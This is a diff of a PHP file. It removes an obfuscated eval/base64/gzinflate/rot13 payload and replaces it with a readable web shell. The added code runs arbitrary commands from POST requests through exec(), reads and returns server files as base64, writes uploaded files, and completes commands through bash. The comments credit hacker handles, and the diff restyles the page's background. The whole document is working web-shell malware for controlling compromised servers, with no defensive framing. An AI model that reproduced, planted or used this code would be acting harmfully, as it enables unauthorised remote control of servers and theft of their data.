@@ -1,5 +1,110 @@
 <?php
-eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
+
+// Thanks To = Mr.TenAr + Mr.V1RX + Sendpie404 + ze2f + Mr.Painlover
+// Terimakasih Sudah  membuat tampilan ini menjadi lebih sempurna
+
+function featureShell($cmd, $cwd) {
+    $stdout = array();
+
+    if (preg_match("/^\s*cd\s*$/", $cmd)) {
+        // pass
+    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
+        chdir($cwd);
+        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
+        chdir($match[1]);
+    } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
+        chdir($cwd);
+        preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
+        return featureDownload($match[1]);
+    } else {
+        chdir($cwd);
+        exec($cmd, $stdout);
+    }
+
+    return array(
+        "stdout" => $stdout,
+        "cwd" => getcwd()
+    );
+}
+
+function featurePwd() {
+    return array("cwd" => getcwd());
+}
+
+function featureHint($fileName, $cwd, $type) {
+    chdir($cwd);
+    if ($type == 'cmd') {
+        $cmd = "compgen -c $fileName";
+    } else {
+        $cmd = "compgen -f $fileName";
+    }
+    $cmd = "/bin/bash -c \"$cmd\"";
+    $files = explode("\n", shell_exec($cmd));
+    return array(
+        'files' => $files,
+    );
+}
+
+function featureDownload($filePath) {
+    $file = @file_get_contents($filePath);
+    if ($file === FALSE) {
+        return array(
+            'stdout' => array('File not found / no read permission.'),
+            'cwd' => getcwd()
+        );
+    } else {
+        return array(
+            'name' => basename($filePath),
+            'file' => base64_encode($file)
+        );
+    }
+}
+
+function featureUpload($path, $file, $cwd) {
+    chdir($cwd);
+    $f = @fopen($path, 'wb');
+    if ($f === FALSE) {
+        return array(
+            'stdout' => array('Invalid path / no write permission.'),
+            'cwd' => getcwd()
+        );
+    } else {
+        fwrite($f, base64_decode($file));
+        fclose($f);
+        return array(
+            'stdout' => array('Done.'),
+            'cwd' => getcwd()
+        );
+    }
+}
+
+if (isset($_GET["feature"])) {
+
+    $response = NULL;
+
+    switch ($_GET["feature"]) {
+        case "shell":
+            $cmd = $_POST['cmd'];
+            if (!preg_match('/2>/', $cmd)) {
+                $cmd .= ' 2>&1';
+            }
+            $response = featureShell($cmd, $_POST["cwd"]);
+            break;
+        case "pwd":
+            $response = featurePwd();
+            break;
+        case "hint":
+            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
+            break;
+        case 'upload':
+            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
+    }
+
+    header("Content-Type: application/json");
+    echo json_encode($response);
+    die();
+}
+
 ?><!DOCTYPE html>
 
 <html>
@@ -10,7 +115,7 @@ eval(str_rot13(gzinflate(str_rot13(base64_decode('LUrHEq3YDfyaqRnvyKG8Iuec2bjImV
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <style>
             html, body {
-                background: url(https://scontent.flux1-1.fna.fbcdn.net/v/t1.0-9/109185442_723119798235133_3698277027341313183_o.jpg?_nc_cat=104&_nc_sid=e3f864&_nc_eui2=AeF4_qGTyn-eCr9v5kWpltmL9WbzDadScZb1ZvMNp1Jxll555z-n8LZch-cAqAzEzbcJc0ktPfXBWCmHjcFSHhzH&_nc_ohc=L7H5gqXJ_fAAX-v6h8y&_nc_ht=scontent.flux1-1.fna&oh=5c2401b3257e5ba0d2d5d84f10fd636a&oe=5F667467);
+                background: url(https://images7.alphacoders.com/332/thumb-1920-332740.jpg);
                 background-size: 100%;
                 background-position: cover;
                 color: #FF4180;
